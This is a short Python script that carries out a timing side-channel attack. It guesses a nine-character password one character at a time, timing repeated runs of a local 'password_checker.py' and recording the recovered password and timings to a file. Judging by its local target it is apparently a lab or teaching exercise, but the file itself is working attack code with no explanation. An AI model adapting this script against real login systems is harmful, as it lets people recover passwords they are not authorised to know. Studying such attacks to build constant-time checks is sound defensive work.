import time
import string
import subprocess


charset = string.ascii_lowercase + string.digits


guessed_password = ""


password_length = 9


measurements = 10


times = []

for i in range(password_length):

    max_time = 0
    correct_char = ""

    for c in charset:

        attempt = guessed_password + c
        total_time = 0

        for _ in range(measurements):

            start = time.time()

            subprocess.run(
                ["python", "password_checker.py"],
                input=attempt,
                text=True,
                capture_output=True
            )

            end = time.time()

            total_time += (end - start)

        avg_time = total_time / measurements

        if avg_time > max_time:
            max_time = avg_time
            correct_char = c

    guessed_password += correct_char
    times.append(max_time)

    print("Guessed so far:", guessed_password)

print("\nRecovered Password:", guessed_password)
print("Timing values:", times)


with open("timing_results.txt", "w") as f:
    f.write("Recovered Password: " + guessed_password + "\n")
    f.write("Timing values: " + str(times))